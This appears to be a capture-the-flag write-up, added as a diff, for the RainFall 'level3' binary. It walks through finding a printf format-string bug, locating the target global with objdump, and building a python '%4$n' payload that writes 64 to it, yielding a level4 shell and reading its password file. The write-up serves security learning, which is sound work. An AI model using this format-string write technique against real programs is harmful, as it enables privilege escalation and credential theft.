@@ -1,0 +1,47 @@
+1. We decompiled the level3 program
+-> It needs to pass a condition on a specific variable
+
+2. After some thinking, the printf format vulnerability was obvious.
+-> We did some research and found that we could use the %x flag to see where is printf parsing the arguments (when there are none) :
+
+`level3@RainFall:~$ ./level3
+%x %x %x %x
+200 b7fd1ac0 b7ff37d0 25207825`
+
+3. The format string actually writes on the 4th offset :
+`level3@RainFall:~$ ./level3
+aaaaaaa %x %x %x %x
+aaaaaaa 200 b7fd1ac0 b7ff37d0 61616161` ('a' = 0x61)
+
+4. We also found the %n flag that writes the number of written characters on the corresponding argument :
+printf("0123456789%n", len)
+len = 10
+
+5. Knowing that, we can use the 3rd point to write the address we want to assign, and use the %n flag on it
+-> But first, we need to find the address to write on :
+
+objdump -d level3
+
+ 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
+ 80484df:	83 f8 40             	cmp    $0x40,%eax
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+
+The condition and comparison are done here, on the address 0x804988c
+It compares to 0x40 (64 in base 10)
+
+6. Ok, we can now write the address on the 4th offset, and write 64 to it
+-> For that, we have to write 64 characters from the string format :
+
+python -c "print('\x8c\x98\x04\x08 %x %x %x %x')" | ./level3
+� 200 b7fd1ac0 b7ff37d0 804988c
+
+-> Now we use the %n (using the %4$n syntax to write on the 4th argument/offset) and add 60 'a'
+python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n')" (\ so python doesnt interpret it)
+
+7. Last, we run the executable with the exploit using "cat -" to keep stdin open :
+python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n')" > /tmp/exploit
+cat /tmp/exploit - | ./level3
+
+8. Shell executed
+whoami -> level4
+cat /home/user/level4/.pass -> (flag)
